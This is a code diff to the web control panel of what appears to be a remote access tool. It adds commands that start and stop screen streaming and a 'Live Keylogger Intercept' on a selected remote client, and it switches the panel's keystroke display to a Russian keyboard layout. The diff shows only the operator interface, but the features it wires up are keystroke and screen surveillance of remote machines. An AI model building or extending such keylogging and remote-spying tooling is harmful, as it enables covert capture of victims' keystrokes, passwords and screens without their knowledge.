@@ -1596,6 +1596,9 @@ function startAudioStream() {
 }
 
 function startStream() {
+    if(!selectedClient) return;
+    execute(selectedClient, 'screen_start');
+
     const html = `
         <div style="width:100%; height:100%; display:flex; flex-direction:column; position:relative; background:#000;">
             <div style="position:absolute; top:10px; right:10px; background:rgba(0,0,0,0.8); padding:4px 10px; border-radius:12px; font-size:0.8rem; z-index:10; border:1px solid var(--accent); color:var(--accent);" id="stream-fps-counter">0 FPS</div>
@@ -1676,37 +1679,50 @@ function startStream() {
         }
     };
 
-    win.onClose = () => { streamWs.close(); };
+    win.onClose = () => { 
+        execute(selectedClient, 'screen_stop');
+        streamWs.close(); 
+    };
 }
 
 function startKeylogger() {
+    if(!selectedClient) return;
+    execute(selectedClient, 'keylog_start');
+
     const kbHtml = `
-        <div style="margin-bottom:10px; color:var(--accent);">Live Keystroke Monitor (Polling Active)</div>
+        <div style="margin-bottom:10px; color:var(--accent); display:flex; justify-content:space-between; align-items:center;">
+            <span>Live Keystroke Monitor (RU Layout Active)</span>
+            <span style="font-size:0.7rem; color:var(--text-muted)">Press keys to see highlight</span>
+        </div>
         <div class="vkb">
             <div class="vkb-row">
                 <div class="vkb-key" id="vk-Escape">ESC</div><div class="vkb-key" id="vk-F1">F1</div><div class="vkb-key" id="vk-F2">F2</div><div class="vkb-key" id="vk-F3">F3</div><div class="vkb-key" id="vk-F4">F4</div><div class="vkb-key" id="vk-F5">F5</div><div class="vkb-key" id="vk-F6">F6</div><div class="vkb-key" id="vk-F7">F7</div><div class="vkb-key" id="vk-F8">F8</div><div class="vkb-key" id="vk-F9">F9</div><div class="vkb-key" id="vk-F10">F10</div><div class="vkb-key" id="vk-F11">F11</div><div class="vkb-key" id="vk-F12">F12</div>
             </div>
             <div class="vkb-row">
-                <div class="vkb-key" id="vk-Oemtilde">~</div><div class="vkb-key" id="vk-D1">1</div><div class="vkb-key" id="vk-D2">2</div><div class="vkb-key" id="vk-D3">3</div><div class="vkb-key" id="vk-D4">4</div><div class="vkb-key" id="vk-D5">5</div><div class="vkb-key" id="vk-D6">6</div><div class="vkb-key" id="vk-D7">7</div><div class="vkb-key" id="vk-D8">8</div><div class="vkb-key" id="vk-D9">9</div><div class="vkb-key" id="vk-D0">0</div><div class="vkb-key" id="vk-OemMinus">-</div><div class="vkb-key" id="vk-OemPlus">=</div><div class="vkb-key backspace" id="vk-Back">BACK</div>
+                <div class="vkb-key" id="vk-Oemtilde">Ё</div><div class="vkb-key" id="vk-D1">1</div><div class="vkb-key" id="vk-D2">2</div><div class="vkb-key" id="vk-D3">3</div><div class="vkb-key" id="vk-D4">4</div><div class="vkb-key" id="vk-D5">5</div><div class="vkb-key" id="vk-D6">6</div><div class="vkb-key" id="vk-D7">7</div><div class="vkb-key" id="vk-D8">8</div><div class="vkb-key" id="vk-D9">9</div><div class="vkb-key" id="vk-D0">0</div><div class="vkb-key" id="vk-OemMinus">-</div><div class="vkb-key" id="vk-OemPlus">=</div><div class="vkb-key backspace" id="vk-Back">BACK</div>
             </div>
             <div class="vkb-row">
-                <div class="vkb-key" id="vk-Tab">TAB</div><div class="vkb-key" id="vk-Q">Q</div><div class="vkb-key" id="vk-W">W</div><div class="vkb-key" id="vk-E">E</div><div class="vkb-key" id="vk-R">R</div><div class="vkb-key" id="vk-T">T</div><div class="vkb-key" id="vk-Y">Y</div><div class="vkb-key" id="vk-U">U</div><div class="vkb-key" id="vk-I">I</div><div class="vkb-key" id="vk-O">O</div><div class="vkb-key" id="vk-P">P</div><div class="vkb-key" id="vk-OemOpenBrackets">[</div><div class="vkb-key" id="vk-OemCloseBrackets">]</div><div class="vkb-key" id="vk-OemPipe">\\</div>
+                <div class="vkb-key" id="vk-Tab">TAB</div><div class="vkb-key" id="vk-Q">Й</div><div class="vkb-key" id="vk-W">Ц</div><div class="vkb-key" id="vk-E">У</div><div class="vkb-key" id="vk-R">К</div><div class="vkb-key" id="vk-T">Е</div><div class="vkb-key" id="vk-Y">Н</div><div class="vkb-key" id="vk-U">Г</div><div class="vkb-key" id="vk-I">Ш</div><div class="vkb-key" id="vk-O">Щ</div><div class="vkb-key" id="vk-P">З</div><div class="vkb-key" id="vk-OemOpenBrackets">Х</div><div class="vkb-key" id="vk-OemCloseBrackets">Ъ</div><div class="vkb-key" id="vk-OemPipe">\\</div>
             </div>
             <div class="vkb-row">
-                <div class="vkb-key" id="vk-Capital">CAPS</div><div class="vkb-key" id="vk-A">A</div><div class="vkb-key" id="vk-S">S</div><div class="vkb-key" id="vk-D">D</div><div class="vkb-key" id="vk-F">F</div><div class="vkb-key" id="vk-G">G</div><div class="vkb-key" id="vk-H">H</div><div class="vkb-key" id="vk-J">J</div><div class="vkb-key" id="vk-K">K</div><div class="vkb-key" id="vk-L">L</div><div class="vkb-key" id="vk-OemSemicolon">;</div><div class="vkb-key" id="vk-OemQuotes">'</div><div class="vkb-key enter" id="vk-Return">ENT</div>
+                <div class="vkb-key" id="vk-Capital">CAPS</div><div class="vkb-key" id="vk-A">Ф</div><div class="vkb-key" id="vk-S">Ы</div><div class="vkb-key" id="vk-D">В</div><div class="vkb-key" id="vk-F">А</div><div class="vkb-key" id="vk-G">П</div><div class="vkb-key" id="vk-H">Р</div><div class="vkb-key" id="vk-J">О</div><div class="vkb-key" id="vk-K">Л</div><div class="vkb-key" id="vk-L">Д</div><div class="vkb-key" id="vk-OemSemicolon">Ж</div><div class="vkb-key" id="vk-OemQuotes">Э</div><div class="vkb-key enter" id="vk-Return">ENT</div>
             </div>
             <div class="vkb-row">
-                <div class="vkb-key shift" id="vk-LShiftKey">SHFT</div><div class="vkb-key" id="vk-Z">Z</div><div class="vkb-key" id="vk-X">X</div><div class="vkb-key" id="vk-C">C</div><div class="vkb-key" id="vk-V">V</div><div class="vkb-key" id="vk-B">B</div><div class="vkb-key" id="vk-N">N</div><div class="vkb-key" id="vk-M">M</div><div class="vkb-key" id="vk-Oemcomma">,</div><div class="vkb-key" id="vk-OemPeriod">.</div><div class="vkb-key" id="vk-OemQuestion">/</div><div class="vkb-key shift" id="vk-RShiftKey">SHFT</div>
+                <div class="vkb-key shift" id="vk-LShiftKey">SHFT</div><div class="vkb-key" id="vk-Z">Я</div><div class="vkb-key" id="vk-X">Ч</div><div class="vkb-key" id="vk-C">С</div><div class="vkb-key" id="vk-V">М</div><div class="vkb-key" id="vk-B">И</div><div class="vkb-key" id="vk-N">Т</div><div class="vkb-key" id="vk-M">Ь</div><div class="vkb-key" id="vk-Oemcomma">Б</div><div class="vkb-key" id="vk-OemPeriod">Ю</div><div class="vkb-key" id="vk-OemQuestion">.</div><div class="vkb-key shift" id="vk-RShiftKey">SHFT</div>
             </div>
             <div class="vkb-row">
                 <div class="vkb-key" id="vk-LControlKey">CTRL</div><div class="vkb-key" id="vk-LWin">WIN</div><div class="vkb-key" id="vk-LMenu">ALT</div><div class="vkb-key space" id="vk-Space">SPACE</div><div class="vkb-key" id="vk-RMenu">ALT</div><div class="vkb-key" id="vk-RWin">WIN</div><div class="vkb-key" id="vk-RControlKey">CTRL</div>
             </div>
         </div>
-        <div id="keylog-buffer" style="margin-top:15px; background:rgba(0,0,0,0.3); padding:10px; border-radius:8px; min-height:80px; font-size:0.8rem; word-wrap:break-word;"></div>
+        <div id="keylog-buffer" style="margin-top:15px; background:rgba(0,0,0,0.3); padding:10px; border-radius:8px; min-height:80px; font-size:0.8rem; word-wrap:break-word; max-height: 200px; overflow-y: auto;"></div>
     `;
 
     const win = createDragWindow('keylog-win', 'Live Keylogger Intercept', 'fa-solid fa-keyboard', kbHtml);
     win.style.width = '700px';
+
+    win.onClose = () => {
+        execute(selectedClient, 'keylog_stop');
+    };
 }
 
 function startProcessManager() {
